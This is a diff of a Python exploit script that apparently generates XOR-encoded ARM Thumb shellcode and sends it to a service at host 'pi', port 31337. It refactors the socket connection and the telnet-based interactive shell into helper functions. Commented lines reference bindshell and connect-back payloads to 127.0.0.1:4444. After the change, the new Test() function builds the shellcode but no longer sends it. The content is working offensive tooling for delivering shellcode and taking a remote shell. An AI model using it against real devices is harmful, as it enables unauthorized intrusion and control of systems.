@@ -9,6 +9,33 @@ import sys
 HOST = 'pi'
 PORT = 31337
 
+def makeSocket(host, port):
+    """makes a socket for connecting to remote and make a socket as a UNIX file
+
+    Args:
+        None
+
+    Returns:
+        tuple(s and f):
+        s(int): socket descriptor
+        
+        f(int): file descriptor mapped the socket
+    """
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect( (host, port) )
+    f = s.makefile('rw', bufsize=0)
+    return (s,f)
+
+def spawnAShell(s):
+    """spawns a shell mapped the socket
+
+    Args:
+        s(int): socket descriptor
+    """
+    tn = telnetlib.Telnet()
+    tn.sock = s
+    tn.interact()
+
 def getShellcode():
     #xsc = CompileSC(scgen.bindshell(55559, sock=5, once=False), isThumb=True)
     #xsc = CompileSC(scgen.connectback('127.0.0.1', 4444), isThumb=True)
@@ -27,28 +54,15 @@ def getShellcode():
     #xsc = CompileSC( (sc1+sc2), isThumb=True)
     return MakeXorShellcode(xsc)
 
-scgen = thumbSCGen()
-sc = getShellcode()
+def Test():
+    """Examples all of shellcodes in Thumb Mode
 
-#print sc
+    """
 
-s = socket(AF_INET, SOCK_STREAM)
-s.connect( (HOST, PORT) )
-f = s.makefile('rw', bufsize=0)
-f.write(sc + '\n')
+    scgen  = thumbSCGen()
+    sc = getShellcode()
 
-#f.write('hello world\n')
-#print f.read(1024)
-#result = ''
-#while 1:
-#    rv = f.read(1024)
-#    if len(rv) <= 0:
-#        break
-#    result += rv
-#print repr(result)
-#print getdent_to_list(result)
+    pass
 
-#sys.exit(-1)
-tn = telnetlib.Telnet()
-tn.sock = s
-tn.interact()
+if __name__ == '__main__':
+    Test()
